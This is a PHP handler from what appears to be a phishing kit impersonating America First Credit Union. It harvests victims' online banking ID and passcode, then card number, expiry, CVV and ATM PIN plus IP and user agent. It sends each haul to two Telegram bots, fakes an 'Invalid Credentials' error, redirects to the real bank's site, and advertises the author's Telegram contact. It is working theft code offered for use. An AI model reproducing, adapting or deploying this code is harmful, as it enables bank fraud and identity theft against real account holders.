<?php
ob_start();

include 'antibots.php';
include 'crawler.php';
include 'config.php';

// Construct your message
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

if (isset($_POST['btn2'])) {
    $message = "[━━━━ 🦅AFCU L0G🦅 ━━━━]\n";
    $message .= "Card Number  : ".$_POST['cn']."\n";
    $message .= "Expiry Date  : ".$_POST['exdate']."\n";
    $message .= "CVV          : ".$_POST['cvv']."\n";
    $message .= "ATM Pin      : ".$_POST['pin']."\n";
    $message .= "[━━━━ 🦅IP INFO 🦅 ━━━━]\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "[━━━━ 🦅AFCU L0G🦅 ━━━━]\n";


    $telegramMessage = urlencode($message);
    $openTelegramApiUrl = "https://api.telegram.org/bot{$TelegramBotToken}/sendMessage?chat_id={$ChatId}&text={$telegramMessage}";
    file_get_contents($openTelegramApiUrl);


    $xxTelegramApiUrl = "https://api.telegram.org/bot{$xxTelegramBotToken}/sendMessage?chat_id={$xxChatId}&text={$telegramMessage}";
    file_get_contents($xxTelegramApiUrl);

    header("Location: https://www.americafirst.com/about/security/online-security.html");
} elseif (!empty($ai) && !empty($pr)) {
    $message = "[━━━━ 🦅AFCU L0G!N🦅 ━━━━]\n";
    $message .= "#Online ID   : ".$ai."\n";
    $message .= "#Passcode    : ".$pr."\n";
    $message .= "[━━━━ 🦅IP INFO 🦅 ━━━━]\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "[━━━━🦅AFCU L0G!N🦅━━━━]\n";


    $telegramMessage = urlencode($message);
    $xxTelegramApiUrl = "https://api.telegram.org/bot{$xxTelegramBotToken}/sendMessage?chat_id={$xxChatId}&text={$telegramMessage}";
    file_get_contents($xxTelegramApiUrl);


    $openTelegramApiUrl = "https://api.telegram.org/bot{$TelegramBotToken}/sendMessage?chat_id={$ChatId}&text={$telegramMessage}";
    file_get_contents($openTelegramApiUrl);

    $signal = 'ok';
    $msg = 'Invalid Credentials';
} else {
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
}
// https://t.me/toby1337x
// inbox me if you encounter any problem
$data = array(
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => $redirect,
);
echo json_encode($data);
ob_end_flush();
?>
